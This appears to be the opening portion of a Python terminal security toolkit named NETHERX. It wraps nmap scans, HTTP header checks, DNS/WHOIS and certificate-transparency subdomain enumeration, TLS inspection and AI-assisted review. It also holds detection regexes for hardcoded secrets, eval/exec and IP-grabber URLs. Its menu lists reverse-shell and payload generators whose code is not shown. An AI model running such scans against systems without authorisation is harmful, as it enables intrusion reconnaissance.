import os
import sys
import re
import json
import ssl
import socket
import math
import hashlib
import base64
import urllib.request
import urllib.error
import urllib.parse
import subprocess
import time
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timezone

try:
    from daytona import Daytona, CreateSandboxBaseParams
    DAYTONA_AVAILABLE = True
except Exception:
    Daytona = None
    CreateSandboxBaseParams = None
    DAYTONA_AVAILABLE = False

# ==========================================
# CONFIGURATION & FIRST-RUN SETUP
# ==========================================
GEMINI_API_KEY = ""
OPENROUTER_API_KEY = ""
OPENROUTER_MODEL = "openai/gpt-oss-20b:free"
daytona = None
ai_client = None

CONFIG_PATH = os.path.join(os.path.expanduser("~"), ".netherx_config.json")

REQUIRED_PACKAGES = [
    ("daytona", "daytona"),
    ("google-genai", "google.genai"),
]

def load_config():
    if os.path.exists(CONFIG_PATH):
        try:
            with open(CONFIG_PATH, "r") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_config(cfg):
    try:
        with open(CONFIG_PATH, "w") as f:
            json.dump(cfg, f, indent=2)
        return True
    except Exception as e:
        print(f"[!] Could not save config: {e}")
        return False

def install_dependencies():
    print("[*] Checking required packages...")
    missing = []
    for pip_name, import_name in REQUIRED_PACKAGES:
        try:
            __import__(import_name)
        except ImportError:
            missing.append(pip_name)
    if not missing:
        print("[+] All required packages already installed.")
        return
    for pip_name in missing:
        print(f"[*] Installing {pip_name} ...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name])
    print("[+] Package installation complete.")

def run_setup_wizard():
    cfg = load_config()

    print("\n=== NETHERX FIRST-TIME SETUP ===")
    print("This is your first run. Installing required packages...\n")
    try:
        install_dependencies()
    except Exception as e:
        print(f"[!] Package installation failed: {e}")
        print("[!] Please install manually: pip install daytona google-genai")

    print("\n--- DAYTONA CLOUD SANDBOX SETUP ---")
    print("1. Open this website in your browser: https://app.daytona.io")
    print("2. Log in or create a free account.")
    print("3. Select your preferred region.")
    print("4. Go to 'API Keys' and generate a new key.")
    print("5. Copy that key and paste it below.\n")
    daytona_key = input("Paste your Daytona API Key here: ").strip()
    if daytona_key:
        cfg["daytona_api_key"] = daytona_key

    print("\n--- OPENROUTER AI SETUP ---")
    print("1. Open this website: https://openrouter.ai")
    print("2. Log in or create a free account.")
    print("3. Go to 'Keys' section and click 'Create Key'.")
    print("4. Copy that key and paste it below.\n")
    openrouter_key = input("Paste your OpenRouter API Key here: ").strip()
    if openrouter_key:
        cfg["openrouter_api_key"] = openrouter_key

    print("\n--- CHOOSE YOUR AI MODEL ---")
    print("Enter any OpenRouter model ID. Examples of free models:")
    print("  openai/gpt-oss-20b:free")
    print("  meta-llama/llama-3.3-70b-instruct:free")
    print("  nvidia/llama-3.1-nemotron-70b-instruct:free")
    print("  deepseek/deepseek-chat-v3.1:free")
    print("(Full list: https://openrouter.ai/models?max_price=0)\n")
    model_name = input("Enter model ID (or press Enter for default 'openai/gpt-oss-20b:free'): ").strip()
    cfg["openrouter_model"] = model_name if model_name else "openai/gpt-oss-20b:free"

    cfg["setup_complete"] = True
    save_config(cfg)

    print("\n[+] Setup complete! Your settings have been saved.")
    print("[*] Please run the program again: python main.py\n")
    sys.exit(0)

def init_clients():
    global daytona, ai_client, GEMINI_API_KEY

    cfg = load_config()
    if not cfg.get("setup_complete"):
        run_setup_wizard()
        return  # run_setup_wizard() exits the program

    daytona_key = cfg.get("daytona_api_key", "")
    if daytona_key:
        os.environ["DAYTONA_API_KEY"] = daytona_key

    if DAYTONA_AVAILABLE:
        try:
            daytona = Daytona()
        except Exception as e:
            daytona = None
            print(f'[!] Daytona init failed: {e}')

    global OPENROUTER_API_KEY, OPENROUTER_MODEL
    OPENROUTER_API_KEY = cfg.get("openrouter_api_key", "")
    OPENROUTER_MODEL = cfg.get("openrouter_model", "openai/gpt-oss-20b:free")
    if OPENROUTER_API_KEY:
        ai_client = True  # just a flag to indicate AI is configured

# Terminal Color Codes
CYAN    = "\033[96m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
RED     = "\033[91m"
BOLD    = "\033[1m"
MAGENTA = "\033[95m"
BLUE    = "\033[94m"
ORANGE  = "\033[38;5;208m"
PURPLE  = "\033[38;5;135m"
PINK    = "\033[38;5;213m"
LIME    = "\033[38;5;154m"
WHITE   = "\033[97m"
GRAY    = "\033[90m"
RESET   = "\033[0m"

import random

# ==========================================
# MATRIX HACKER THEME ENGINE (v6.0 Pro UI)
# ==========================================
START_TIME = time.time()

def c(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

MGREEN = [(0,255,65),(0,230,60),(0,200,50),(50,255,100),(120,255,140)]
MLIME  = [(180,255,0),(200,255,60),(220,255,100),(160,240,40),(140,220,20)]
G1 = c(0, 255, 65)      # bright matrix green
G2 = c(140, 255, 160)   # light green
GD = c(0, 110, 25)      # dim green (code rain)

def grad_text(text, palette, shift=0):
    out = ""
    for i, ch in enumerate(text):
        r, g, b = palette[(i + shift) % len(palette)]
        out += c(r, g, b) + ch
    return out + RESET

NETHERX_ASCII = [
    "███╗   ██╗███████╗████████╗██╗  ██╗███████╗██████╗ ██╗  ██╗",
    "████╗  ██║██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗╚██╗██╔╝",
    "██╔██╗ ██║█████╗     ██║   ███████║█████╗  ██████╔╝ ╚███╔╝ ",
    "██║╚██╗██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗ ██╔██╗ ",
    "██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║██╔╝ ██╗",
    "╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝",
]

def show_banner():
    w = 101
    print()
    print(grad_text("=== NETHERX v6.0 Pro — Advanced Cybersecurity Suite ===".center(w), MGREEN))
    for i, line in enumerate(NETHERX_ASCII):
        print(grad_text(line.center(w), MLIME, shift=i * 2))
    print(grad_text(">> Knowledge. Exploit. Control. <<".center(w), MGREEN))
    print()
    
def show_banner():
    w = 101
    print()
    print(grad_text("=== NETHERX v6.0 Pro — Advanced Cybersecurity Suite ===".center(w), MGREEN))
    for i, line in enumerate(NETHERX_ASCII):
        print(grad_text(line.center(w), MLIME, shift=i * 3))
    print(grad_text(">> Knowledge. Exploit. Control. <<".center(w), MGREEN))
    print()

def mbox_top():
    return f"{G1}┌{'─' * 101}┐{RESET}"
def mbox_mid():
    return f"{G1}├{'─' * 101}┤{RESET}"
def mbox_bot():
    return f"{G1}└{'─' * 101}┘{RESET}"
def mbox_line(text):
    return f"{G1}│{RESET}" + pad_to_width(text, 101) + f"{G1}│{RESET}"

def matrix_columns(items, cols=4, cell_w=22):
    rows = (len(items) + cols - 1) // cols
    result = []
    for r in range(rows):
        parts = []
        for cc in range(cols):
            idx = r * cols + cc
            if idx < len(items):
                num, _clr, name = items[idx]
                tag = f"{G2}«{num.zfill(2)}»{RESET}"
                cell = f"{tag} {G1}{name}{RESET}"
                parts.append(pad_to_width(cell, cell_w))
            else:
                parts.append(' ' * cell_w)
        result.append('    '.join(parts))
    return '\n'.join(result)

def show_status_bar():
    up = int(time.time() - START_TIME)
    hh, mm, ss = up // 3600, (up % 3600) // 60, up % 60
    ai_on = bool(OPENROUTER_API_KEY)
    sb_on = bool(daytona)
    print()
    print(mbox_top())
    bar = (f"  {G2}⦿{RESET} {G1}AI engine:{RESET} {G2}{'online' if ai_on else 'offline'}{RESET}"
           f"  {GD}|{RESET} {G1}sandbox:{RESET} {G2}{'active' if sb_on else 'off'}{RESET}"
           f"  {GD}|{RESET} {G1}integrity:{RESET} {G2}secure{RESET}"
           f"  {GD}|{RESET} {G1}uptime:{RESET} {G2}{hh:02d}:{mm:02d}:{ss:02d}{RESET}")
    print(mbox_line(bar))
    print(mbox_bot())

def visible_len(s):
    return len(re.sub(r'\x1b\[[0-9;]*m', '', s))

def pad_to_width(s, width):
    vlen = visible_len(s)
    if vlen < width:
        return s + ' ' * (width - vlen)
    return s

def render_columns(items, cols=4, cell_w=22):
    rows = (len(items) + cols - 1) // cols
    result = []
    for r in range(rows):
        parts = []
        for c in range(cols):
            idx = r * cols + c
            if idx < len(items):
                num, color, name = items[idx]
                tag = f"{color}«{num.zfill(2)}»{RESET}"
                cell = f"{tag} {WHITE}{name}{RESET}"
                parts.append(pad_to_width(cell, cell_w))
            else:
                parts.append(' ' * cell_w)
        result.append('    '.join(parts))
    return '\n'.join(result)

def hline(char='─', color=CYAN):
    return color + char * 76 + RESET

def box_top():
    return f"{CYAN}┌{'─' * 101}┐{RESET}"

def box_mid():
    return f"{CYAN}├{'─' * 101}┤{RESET}"

def box_bot():
    return f"{CYAN}└{'─' * 101}┘{RESET}"

def box_line(text, align='left'):
    if align == 'center':
        text = center_text(text, 101)
    else:
        text = pad_to_width(text, 101)
    return f"{CYAN}│{RESET}{text}{CYAN}│{RESET}"

def center_text(text, width):
    vlen = visible_len(text)
    if vlen >= width:
        return text
    left = (width - vlen) // 2
    right = width - vlen - left
    return ' ' * left + text + ' ' * right

MENU_CORE = [
    ("1",  RED,     "AI Static Audit"),
    ("2",  GREEN,   "AI Phishing Det"),
    ("3",  YELLOW,  "Network Scan"),
    ("4",  BLUE,    "Web Headers"),
    ("5",  MAGENTA, "DNS WHOIS Recon"),
    ("6",  CYAN,    "AI CVE Search"),
    ("7",  RED,     "Subdomain Enum"),
    ("8",  GREEN,   "SSL/TLS Inspect"),
]

MENU_WEB = [
    ("9",  YELLOW,  "Exposed Files"),
    ("10", BLUE,    "Deep Headers"),
    ("11", MAGENTA, "Dir Brute Forcer"),
    ("12", CYAN,    "API Fuzzer"),
    ("13", RED,     "SQLi/XSS Payloads"),
    ("14", GREEN,   "JWT Analyzer"),
    ("15", YELLOW,  "Secret Scanner"),
    ("16", BLUE,    "API Sec Scanner"),
]

MENU_NET = [
    ("17", MAGENTA, "Port Vuln Match"),
    ("18", CYAN,    "WHOIS Geo Track"),
    ("19", RED,     "WiFi Auditor"),
    ("20", GREEN,   "Firewall Analyze"),
    ("21", YELLOW,  "Traffic Analyze"),
    ("22", BLUE,    "PCAP Analyzer"),
    ("23", MAGENTA, "ARP Detector"),
    ("24", CYAN,    "DNS Tunnel Det"),
]

MENU_FORENSICS = [
    ("25", RED,     "Pass/Hash Audit"),
    ("26", GREEN,   "Log Analyzer"),
    ("27", YELLOW,  "Registry Forensic"),
    ("28", BLUE,    "Memory Dump"),
    ("29", MAGENTA, "Process Anomaly"),
    ("30", CYAN,    "File Integrity"),
    ("31", RED,     "Keylogger Det"),
    ("32", GREEN,   "Rootkit Scanner"),
]

MENU_CLOUD = [
    ("33", YELLOW,  "Dependency Audit"),
    ("34", BLUE,    "Container Scan"),
    ("35", MAGENTA, "Cloud Misconfig"),
    ("36", CYAN,    "S3 Bucket Scan"),
    ("37", RED,     "Database Scan"),
    ("38", GREEN,   "SBOM Generator"),
    ("39", YELLOW,  "Compliance Check"),
    ("40", BLUE,    "Supply Chain"),
]

MENU_INTEL = [
    ("41", MAGENTA, "Incident Response"),
    ("42", CYAN,    "Threat Intel Feed"),
    ("43", RED,     "IOC Scanner"),
    ("44", GREEN,   "YARA Generator"),
    ("45", YELLOW,  "Dark Web Monitor"),
    ("46", BLUE,    "SE Toolkit"),
    ("47", MAGENTA, "Rev Shell Gen"),
    ("48", CYAN,    "Email Sec Audit"),
]

MENU_ADVANCED = [
    ("49", RED,     "DDoS Advisor"),
    ("50", GREEN,   "Backup Verify"),
    ("51", YELLOW,  "Ransomware Check"),
    ("52", BLUE,    "Malware Sandbox"),
    ("53", MAGENTA, "System Health"),
    ("54", CYAN,    "Steganography"),
]

MENU_SYSTEM = [
    ("55", YELLOW,  "Help & Manual"),
    ("56", RED,     "Exit"),
]

MENU_TRACKER = [
    ("57", RED,     "Threat Tracker"),
]

MENU_LIVE_INTEL = [
    ("59", RED,     "VirusTotal Look"),
    ("60", GREEN,   "Deep IP Intel"),
    ("61", YELLOW,  "AbuseIPDB Check"),
    ("62", BLUE,    "NVD CVE Lookup"),
    ("63", MAGENTA, "HIBP Pass Check"),
]

MENU_BOUNTY = [
    ("64", CYAN,    "Subdomain TKO"),
    ("65", RED,     "WAF Detector"),
    ("66", GREEN,   "WP/CMS Scanner"),
    ("67", YELLOW,  "Recon Pipeline"),
    ("68", BLUE,    "Nuclei Scan"),
]

MENU_PROWORK = [
    ("69", MAGENTA, "CVSS Calculator"),
    ("70", CYAN,    "Pentest Report"),
    ("71", GREEN,   "Local AI Ollama"),
]

MENU_CREDITS = [
    ("58", CYAN,    "Developer Info"),
]

# ==========================================
# MATRIX RAIN UPDATE (background numbers)
# ==========================================
RAINF = "0123456789ABCDEF0123456789#$*"

def _rain(n):
    return ''.join(random.choice(RAINF) if random.random() < 0.55 else ' ' for _ in range(n))

def _side():
    try:
        return 3 if os.get_terminal_size().columns >= 112 else 0
    except Exception:
        return 0

def mbox_top():
    s = _side()
    r = f"{GD}{_rain(s)}{RESET}" if s else ""
    return r + f"{G1}┌{'─' * 101}┐{RESET}" + r

def mbox_mid():
    s = _side()
    r = f"{GD}{_rain(s)}{RESET}" if s else ""
    return r + f"{G1}├{'─' * 101}┤{RESET}" + r

def mbox_bot():
    s = _side()
    r = f"{GD}{_rain(s)}{RESET}" if s else ""
    return r + f"{G1}└{'─' * 101}┘{RESET}" + r

def mbox_line(text):
    s = _side()
    r = f"{GD}{_rain(s)}{RESET}" if s else ""
    return r + f"{G1}│{RESET}" + pad_to_width(text, 101) + f"{G1}│{RESET}" + r

def show_banner():
    w = 101
    s = _side()
    print()
    if s:
        print(f"{GD}{_rain(w + 8)}{RESET}")
    print(grad_text("=== NETHERX v6.0 Pro — Advanced Cybersecurity Suite ===".center(w), MGREEN))
    for i, line in enumerate(NETHERX_ASCII):
        r = f"{GD}{_rain(s)}{RESET}" if s else ""
        print(r + grad_text(line.center(w), MLIME, shift=i * 2) + r)
    print(grad_text(">> Knowledge. Exploit. Control. <<".center(w), MGREEN))
    if s:
        print(f"{GD}{_rain(w + 8)}{RESET}")
    print()

# ==========================================
# CLEAN MATRIX UI (scattered side rain removed)
# ==========================================
def mbox_top():
    return f"{G1}┌{'─' * 101}┐{RESET}"

def mbox_mid():
    return f"{G1}├{'─' * 101}┤{RESET}"

def mbox_bot():
    return f"{G1}└{'─' * 101}┘{RESET}"

def mbox_line(text):
    return f"{G1}│{RESET}" + pad_to_width(text, 101) + f"{G1}│{RESET}"

def show_banner():
    w = 101
    print()
    print(grad_text("=== NETHERX v6.0 Pro — Advanced Cybersecurity Suite ===".center(w), MGREEN))
    for i, line in enumerate(NETHERX_ASCII):
        print(grad_text(line.center(w), MLIME, shift=i * 2))
    print(grad_text(">> Knowledge. Exploit. Control. <<".center(w), MGREEN))
    print()

def show_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    show_banner()
    print(mbox_top())
    sections = [
        ("CORE AUDIT & THREAT ANALYSIS", MENU_CORE),
        ("WEB APPLICATION SECURITY", MENU_WEB),
        ("NETWORK & INFRASTRUCTURE", MENU_NET),
        ("SYSTEM FORENSICS", MENU_FORENSICS),
        ("CLOUD & DEVSECOPS", MENU_CLOUD),
        ("THREAT INTELLIGENCE", MENU_INTEL),
        ("ADVANCED OPERATIONS", MENU_ADVANCED),
        ("SYSTEM", MENU_SYSTEM),
        ("THREAT INTELLIGENCE & TRACKING", MENU_TRACKER),
        ("CREDITS & DEVELOPER INFO", MENU_CREDITS),
        ("LIVE THREAT INTELLIGENCE APIs", MENU_LIVE_INTEL),
        ("BUG BOUNTY & PENTEST POWER", MENU_BOUNTY),
        ("PRO WORKFLOW & REPORTING", MENU_PROWORK),
        ("UTILITY & PRIVACY", MENU_UTILS),
        ("ELITE FORENSICS & RED TEAM", MENU_ELITE),
    ]
    for i, (title, items) in enumerate(sections):
        if i > 0:
            print(mbox_mid())
        print(mbox_line(f"  {GD}[{RESET} {BOLD}{G2}{title}{RESET} {GD}]{RESET}"))
        for line in matrix_columns(items, 4).split('\n'):
            print(mbox_line(' ' + line))
    print(mbox_bot())
    show_status_bar()
# ==========================================
# CORE HELPERS
# ==========================================

def call_gemini(prompt):
    if not ai_client or not OPENROUTER_API_KEY:
        return f"{RED}[!] OpenRouter API Key not set. Run setup again to configure it.{RESET}"
    clean_instruction = (
        'CRITICAL FORMATTING RULE: Respond in plain text only. '
        'Do NOT use Markdown. No asterisks, no hash symbols, no bullet lists, no backticks, no underscores, no horizontal lines. '
        'Use at most 6 short sentences. Be extremely concise and direct.'
    )
    full_prompt = clean_instruction + '\n\nTask: ' + prompt

    payload = json.dumps({
        "model": OPENROUTER_MODEL,
        "messages": [{"role": "user", "content": full_prompt}]
    }).encode('utf-8')
    req_headers = {
        "Authorization": f"Bearer {OPENROUTER_API_KEY}",
        "Content-Type": "application/json",
    }

    result = None
    max_retries = 2
    for attempt in range(max_retries + 1):
        try:
            req = urllib.request.Request(
                "https://openrouter.ai/api/v1/chat/completions",
                data=payload,
                headers=req_headers,
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=60) as resp:
                result = json.loads(resp.read().decode('utf-8'))
            break
        except urllib.error.HTTPError as e:
            err_body = e.read().decode('utf-8', errors='ignore')
            if e.code == 429 and attempt < max_retries:
                time.sleep(5)
                continue
            if e.code == 429:
                return f"{RED}[!] OpenRouter rate limit hit ({OPENROUTER_MODEL}): {err_body[:300]}\n[*] This free model may be globally overloaded right now. Try again in a minute, or switch to another free model.{RESET}"
            return f"{RED}[!] OpenRouter Request Failed ({e.code}): {err_body[:300]}{RESET}"
        except Exception as e:
            return f"{RED}[!] OpenRouter Request Failed: {e}{RESET}"

    if result is None:
        return f"{RED}[!] OpenRouter Request Failed: No response received.{RESET}"

    try:
        text = result.get('choices', [{}])[0].get('message', {}).get('content', '')
        text = re.sub(r'\*\*?([^*]+)\*\*?', r'\1', text)
        text = re.sub(r'`+', '', text)
        text = re.sub(r'^\s*#{1,6}\s*', '', text, flags=re.M)
        text = re.sub(r'^\s*[-*+]\s+', '', text, flags=re.M)
        text = re.sub(r'^\s*>\s*', '', text, flags=re.M)
        text = re.sub(r'^\s*---+?\s*$', '', text, flags=re.M)
        text = re.sub(r'_{2,}', '', text)
        text = re.sub(r'\n{3,}', '\n\n', text).strip()
        sentences = re.split(r'(?<=[.!?])\s+', text)
        if len(sentences) > 7:
            text = ' '.join(sentences[:7])
        return text
    except Exception as e:
        return f"{RED}[!] Failed to parse OpenRouter response: {e}{RESET}"

def create_cloud_sandbox(max_retries=2):
    if not DAYTONA_AVAILABLE or daytona is None:
        print(f"{RED}[!] Daytona is not available. Skipping sandbox operations.{RESET}")
        return None
    print(f"\n{CYAN}[*] Launching Isolated Daytona Cloud Sandbox...{RESET}")
    last_error = None
    for attempt in range(max_retries + 1):
        try:
            sb = daytona.create(CreateSandboxBaseParams(language='python'))
            time.sleep(2)  # give the sandbox a moment to fully initialize
            print(f"{GREEN}[+] Sandbox created successfully.{RESET}")
            return sb
        except Exception as e:
            last_error = e
            if attempt < max_retries:
                print(f"{YELLOW}[!] Sandbox creation attempt {attempt + 1} failed, retrying in 3s...{RESET}")
                time.sleep(3)
                continue
    print(f"{RED}[!] Failed to create Daytona sandbox after {max_retries + 1} attempts: {last_error}{RESET}")
    return None

def run_remote_python(sandbox, script_code, remote_path='/tmp/task_script.py', args=''):
    if sandbox is None:
        return f"{RED}[!] No sandbox available. Cannot run remote code.{RESET}"
    try:
        local_tmp = '/tmp/_suite_task_script.py'
        os.makedirs('/tmp', exist_ok=True)
        with open(local_tmp, 'w', encoding='utf-8') as f:
            f.write(script_code)
        sandbox.fs.upload_file(local_tmp, remote_path)
        result = sandbox.process.exec(f"python3 {remote_path} {args}")
        return result.result if hasattr(result, 'result') else str(result)
    except Exception as e:
        return f"{RED}[!] Remote execution failed: {e}{RESET}"

def safe_domain(raw):
    if not raw:
        return ''
    raw = raw.strip()
    raw = re.sub(r'^https?://', '', raw, flags=re.I)
    raw = raw.split('/')[0]
    return raw.strip()

def validate_domain(domain):
    if not domain:
        print(f"{RED}[!] No domain provided.{RESET}")
        return False
    if not re.match(r'^[a-zA-Z0-9_.-]+$', domain):
        print(f"{RED}[!] Invalid domain format.{RESET}")
        return False
    return True

def validate_ip(ip):
    if not ip:
        return False
    pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    return bool(re.match(pattern, ip))

def get_input(prompt_text):
    try:
        return input(prompt_text).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None

def press_enter():
    try:
        input(f"\n{YELLOW}Press Enter to continue...{RESET}")
    except (EOFError, KeyboardInterrupt):
        pass

def print_section(title):
    print(f"\n{YELLOW}{BOLD}--- {title} ---{RESET}")

def print_error(msg):
    print(f"{RED}[!] {msg}{RESET}")

def print_success(msg):
    print(f"{GREEN}[+] {msg}{RESET}")

def print_info(msg):
    print(f"{CYAN}[*] {msg}{RESET}")

def print_warn(msg):
    print(f"{YELLOW}[!] {msg}{RESET}")

def ai_assess(prompt):
    print(f"\n{MAGENTA}[+] Querying OpenRouter...{RESET}")
    print(f"{YELLOW}--- OpenRouter RESPONSE ---{RESET}")
    print(call_gemini(prompt))
def audit_file(sandbox, file_path):
    if not os.path.exists(file_path):
        print_error(f"File '{file_path}' not found!")
        return
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            code_content = f.read()
    except Exception as e:
        print_error(f'Could not read file: {e}')
        return
    print_info(f"Reading '{file_path}'...")
    if sandbox:
        try:
            abs_path = os.path.abspath(file_path)
            sandbox.fs.upload_file(abs_path, '/tmp/target_file.py')
            audit_script = r"""
import re
with open('/tmp/target_file.py', 'r') as f:
    code = f.read()
issues = []
if re.search(r'(api_key|password|secret|token|private_key)\s*=\s*[\'"].+[\'"]', code, re.I):
    issues.append('CRITICAL: Hardcoded API Key/Password/Token!')
if 'eval(' in code or 'exec(' in code:
    issues.append('HIGH: Dangerous Execution Function (eval/exec)!')
if 'os.system' in code or 'subprocess' in code:
    issues.append('WARNING: System Command Execution!')
if 'b64decode' in code or 'base64' in code:
    issues.append('SUSPICIOUS: Obfuscated Base64 String Found!')
if 'pickle.loads' in code:
    issues.append('HIGH: Unsafe Deserialization (pickle)!')
if 'yaml.load' in code and 'SafeLoader' not in code:
    issues.append('HIGH: Unsafe YAML Loading!')
if 'input(' in code and 'eval' in code:
    issues.append('CRITICAL: eval() on user input!')
print('\n--- STATIC AUDIT RESULTS ---')
if issues:
    for x in issues:
        print(' [!] ' + x)
else:
    print(' [OK] No basic static vulnerabilities found.')
"""
            print(run_remote_python(sandbox, audit_script))
        except Exception as e:
            print_error(f'Static audit failed: {e}')
    try:
        prompt = f"Analyze this Python code for security risks, backdoors, logic bugs, or data leaks. Be concise:\n\n```python\n{code_content[:4000]}\n```"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI review failed: {e}')

def analyze_phishing_url(sandbox, url):
    if not url:
        print_error('No URL provided.')
        return
    print_info(f'Running Rule-Based Inspection for: {url}...')
    issues = []
    if re.search(r'(grabify|iplogger|2no\.co|bmw5\.eu|yip\.su|bit\.ly|tinyurl|t\.co)', url, re.I):
        issues.append('SUSPICIOUS: Known tracker/shortener domain!')
    if re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', url):
        issues.append('WARNING: Raw IP address in URL!')
    if url.count('.') > 4:
        issues.append('SUSPICIOUS: Excessive subdomains!')
    if '@' in url:
        issues.append('SUSPICIOUS: Credential-harvesting @ trick detected!')
    print_section('RULE-BASED ANALYSIS')
    if issues:
        for x in issues:
            print_warn(x)
    else:
        print_success('No basic URL anomalies detected.')
    try:
        prompt = f"Analyze this URL for phishing, credential harvesting, or IP-grabbing risks: {url}. Explain briefly why safe or dangerous."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI threat assessment failed: {e}')

def scan_network(sandbox, target):
    if not validate_domain(target) and not validate_ip(target):
        return
    print_info(f'Installing & Running Nmap on {target}...')
    output = ''
    if sandbox:
        try:
            sandbox.process.exec('sudo apt update -y > /dev/null 2>&1 && sudo apt install -y nmap > /dev/null 2>&1')
            scan_res = sandbox.process.exec(f'nmap -sV -F {target}')
            output = scan_res.result if hasattr(scan_res, 'result') else str(scan_res)
        except Exception as e:
            print_error(f'Nmap scan failed: {e}')
    print_section('NETWORK SCAN RESULTS')
    print(output if output else '(No scan output)')
    if output:
        try:
            prompt = f"Review these Nmap results for '{target}'. Identify risks for open ports and recommend hardening:\n\n{output}"
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI analysis failed: {e}')
    return output

def scan_web_headers(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target):
        return
    print_info(f'Retrieving HTTP Security Headers for {target}...')
    headers_output = ''
    if sandbox:
        try:
            cmd = f"curl -s -I -L http://{target} | grep -iE '(Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Content-Security-Policy|Server)'"
            res = sandbox.process.exec(cmd)
            headers_output = res.result if hasattr(res, 'result') else str(res)
        except Exception as e:
            print_error(f'Header retrieval failed: {e}')
    print_section('WEB SECURITY HEADERS')
    if headers_output.strip():
        print(headers_output)
    else:
        print_warn('Missing critical security headers (HSTS, CSP, X-Frame-Options)!')
    try:
        prompt = f"Analyze these web headers for '{target}'. Explain which missing headers should be added:\n\n{headers_output if headers_output.strip() else 'No secure headers returned.'}"
        ai_assess(prompt)
    except Exception as e:
        print_error(f'AI header analysis failed: {e}')

def scan_dns_recon(sandbox, target):
    target = safe_domain(target)
    if not validate_domain(target):
        return
    print_info(f'Gathering DNS & WHOIS for {target}...')
    if sandbox:
        try:
            sandbox.process.exec('sudo apt update -y > /dev/null 2>&1 && sudo apt install -y whois dnsutils > /dev/null 2>&1')
        except Exception as e:
            print_warn(f'Package install warning: {e}')
        try:
            dns_res = sandbox.process.exec(f'host {target}')
            print_section('DNS RECON')
            print(dns_res.result if hasattr(dns_res, 'result') else str(dns_res))
        except Exception as e:
            print_error(f'DNS lookup failed: {e}')
        try:
            whois_res = sandbox.process.exec(f'whois {target} | head -n 30')
            print_section('WHOIS SUMMARY')
            print(whois_res.result if hasattr(whois_res, 'result') else str(whois_res))
        except Exception as e:
            print_error(f'WHOIS lookup failed: {e}')

def search_cve_ai():
    software = get_input(f"{BOLD}Enter Software & Version (e.g., Apache 2.4.41): {RESET}")
    if not software:
        print_error('No software entered.')
        return
    try:
        prompt = f"List top known CVEs and security risks for: '{software}'. Include mitigation steps."
        ai_assess(prompt)
    except Exception as e:
        print_error(f'CVE search failed: {e}')

def enumerate_subdomains(sandbox, domain):
    domain = safe_domain(domain)
    if not validate_domain(domain):
        return
    print_info(f'Querying Certificate Transparency Logs for *.{domain}...')
    output = ''
    if sandbox:
        try:
            script = f"""
import json, urllib.request
domain = {json.dumps(domain)}
url = 'https://crt.sh/?q=%25.' + domain + '&output=json'
subdomains = set()
try:
    req = urllib.request.Request(url, headers={{'User-Agent': 'SecuritySuite/4.0'}})
    with urllib.request.urlopen(req, timeout=25) as resp:
        raw = resp.read().decode('utf-8', errors='ignore')
    data = json.loads(raw)
    for entry in data:
        name_value = entry.get('name_value', '')
        for name in name_value.split('\n'):
            name = name.strip().lower()
            if name and '*' not in name and name.endswith(domain):
                subdomains.add(name)
except Exception as e:
    print('[!] Lookup failed: ' + str(e))
print('\n--- SUBDOMAIN ENUMERATION ---')
if subdomains:
    for s in sorted(subdomains):
        print(' [+] ' + s)
    print('\nTotal: ' + str(len(subdomains)))
else:
    print(' [!] No subdomains found.')
"""
            output = run_remote_python(sandbox, script)
            print(f"\n{YELLOW}{output}{RESET}")
        except Exception as e:
            print_error(f'Subdomain enumeration failed: {e}')
    if output and '[+]' in output:
        try:
            prompt = f"Given these subdomains for '{domain}', point out the most interesting ones for security testing (admin, staging, dev, api, vpn) and why:\n\n{output}"
            ai_assess(prompt)
        except Exception as e:
            print_error(f'AI prioritization failed: {e}')

def inspect_ssl_certificate(target):
    target = safe_domain(target)
    if not target:
        print_error('No target provided.')
        return
    port = 443
    print_info(f'Connecting to {target}:{port}...')
    cert = None; cipher = None; tls_version = None; verified = True
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((target, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert(); cipher = ssock.cipher(); tls_version = ssock.version()
        verified = True
    except ssl.SSLCertVerificationError as e:
        print_warn(f'Certificate verification failed: {e}')
        try:
            ctx = ssl._create_unverified_context()
            with socket.create_connection((target, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                    cert = ssock.getpeercert(); cipher = ssock.cipher(); tls_version = ssock.version()
            verified = False
        except Exception as e2:
            print_error(f'Could not retrieve certificate: {e2}'); return
    except Exception as e:
        print_error(f'Connection failed: {e}'); return
    if not cert:
        print_error('No certificate data retrieved.'); return
    def flatten(name_tuple):
        return ', '.join(f'{k}={v}' for pair in name_tuple for (k, v) in pair)
    issuer = flatten(cert.get('issuer', []))
    subject = flatten(cert.get('subject', []))
    not_after_str = cert.get('notAfter', '')
    san = cert.get('subjectAltName', [])
    expiry_line = ''; days_left = None
    try:
        not_after = datetime.strptime(not_after_str, '%b %d %H:%M:%S %Y %Z').replace(tzinfo=timezone.utc)
        days_left = (not_after - datetime.now(timezone.utc)).days
        expiry_line = f'{not_after_str} ({days_left} days remaining)'
    except Exception:
        expiry_line = not_after_str or 'Unknown'
    print_section(f'SSL/TLS CERTIFICATE: {target}')
    print(f' Subject:      {subject or "N/A"}')
    print(f' Issuer/CA:    {issuer or "N/A"}')
    print(f' Trust Chain:  {"Verified" if verified else "NOT VERIFIED"}')
